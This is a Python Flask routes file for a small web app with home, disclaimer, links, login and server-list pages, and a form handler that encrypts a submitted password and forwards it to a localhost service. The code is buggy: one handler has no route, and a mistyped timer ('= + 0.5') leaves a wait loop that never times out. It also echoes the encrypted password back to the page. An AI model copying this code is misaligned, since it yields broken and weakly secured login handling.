from app import app
from flask import render_template, request
from cryptography.fernet import Fernet
import requests
from dotenv import load_dotenv
import os
import time

load_dotenv()

key = os.getenv('key')

cipher_suite = Fernet(key)

# Home page route
@app.route('/')
def home():
    return render_template('index.html')

# Disclaimer page route
@app.route('/disclaimer')
def disclaimer():
    return render_template('disclaimer.html')

# Homepage route
@app.route('/homepage')
def homepage():
    return render_template('homepage.html')

# Links page route
@app.route('/links')
def links():
    return render_template('links.html')

# Login page route
@app.route('/login')
def login():
    return render_template('login.html')

# Server List page route
@app.route('/server-list')
def server_list():
    return render_template('server-list.html')

@app.route('/process', methods=['POST'])
def processSend():
  
      user = request.form.get('user/email')
      EnPass = cipher_suite.encrypt(request.form.get('password').encode())
     
      requests.post('http://localhost:5500/login-request', data={'user': user, 'password': EnPass})

      return render_template('process.html', user=user, password=EnPass.decode())
def processRecieve():
    user = request.form.get('user')
    timer = 0
    notFound = 'No user found'
    
    while user == None:
        time.sleep(0.5)
        user = request.form.get('user')
        timer = + 0.5
        if timer == 60:
            user = notFound
            break
        print(timer)
    
    if user == notFound:
        return render_template('process.html')
    else:
        pass